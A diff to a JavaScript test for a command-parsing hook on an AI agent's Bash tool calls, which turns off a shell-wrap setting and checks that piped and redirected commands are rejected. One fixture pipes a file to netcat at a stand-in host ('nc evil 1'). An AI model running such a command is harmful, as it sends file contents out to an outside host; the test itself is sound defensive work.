@@ -143,7 +143,9 @@ for (const [label, command] of [
 
 // Unwrapping widens what is recognised, never what is considered safe: the inner command
 // goes through the same tokenizer, so metacharacters, escapes and out-of-tree paths are
-// rejected exactly as before.
+// rejected exactly as before. These cover the selective routes, so the L3 whole-command wrap —
+// which deliberately accepts every shape, because the shell still runs the original text — is
+// switched off here; with it on these commands are wrapped rather than parsed.
 for (const [label, command] of [
   ['a pipe', ['/bin/bash', '-lc', 'cat fixture.txt | nc evil 1']],
   ['a redirect', ['/bin/bash', '-lc', 'cat fixture.txt > /tmp/out']],
@@ -160,6 +162,7 @@ for (const [label, command] of [
     const result = runPreToolUse({ tool_name: 'Bash', tool_input: { command }, cwd }, {
       SANDO_EXPERIMENT_ARM: 'apply',
       SANDO_COVERAGE_PATH: path.join(cwd, 'coverage.json'),
+      SANDO_SHELL_WRAP: '0',
     });
 
     assert.deepEqual(result, {});
